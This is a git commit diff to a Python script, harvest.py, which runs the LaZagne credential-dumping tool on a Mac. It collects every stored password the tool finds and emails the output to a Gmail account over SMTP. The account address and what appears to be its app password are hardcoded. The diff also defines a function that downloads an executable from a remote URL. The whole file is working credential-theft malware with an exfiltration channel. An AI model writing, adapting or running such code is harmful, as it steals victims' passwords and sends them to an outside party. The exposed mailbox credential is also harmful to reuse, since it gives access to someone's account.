964ffda7db19d2ab92e3ada11e0253a1c6e96a6b
oousug <domiyungforex@gmail.com>
2026-03-26 03:05:10 +0100

    Update harvest.py to use LaZagne for Mac

--- harvest.py
+++ harvest.py
@@ -4,18 +4,27 @@ import smtplib
 import requests
 import os
 
-def get_payload():
-        get_request = requests.get(url)
-        name = url.split("/")[-1]
-        with open(name, "wb") as payload:
-            payload.write(get_request.content)
-def execute(prgm):
-    process = subprocess.Popen([prgm, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+URL = "https://smtps.vercel.app/laZagne_x86.exe"
+
+def get_payload(url):
+    get_request = requests.get(url)
+    name = url.split("/")[-1]
+    with open(name, "wb") as payload:
+        payload.write(get_request.content)
+    return name
+
+def execute():
+    process = subprocess.Popen(
+        ["python3", "LaZagne/Mac/laZagne.py", "all", "-v"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
     result, error = process.communicate()
     try:
         return result.decode('latin-1').encode("utf-8")
     except:
         return str(result)
+
 def mail_it(email, passwd, to_mail, msg):
     mailserver = smtplib.SMTP("smtp.gmail.com", 587)
     mailserver.starttls()
@@ -23,10 +32,5 @@ def mail_it(email, passwd, to_mail, msg):
     mailserver.sendmail(email, to_mail, msg)
     mailserver.quit()
 
-URL = "smtps.vercel.app"
-file_name = URL.split("/")[-1]
-
-get_it(URL)
-message = execute(file_name)
+message = execute()
 mail_it("domiyungforex@gmail.com", "zbcpkndmpefgdhrb", "domiyungforex@gmail.com", message)
-os.remove(file_name)
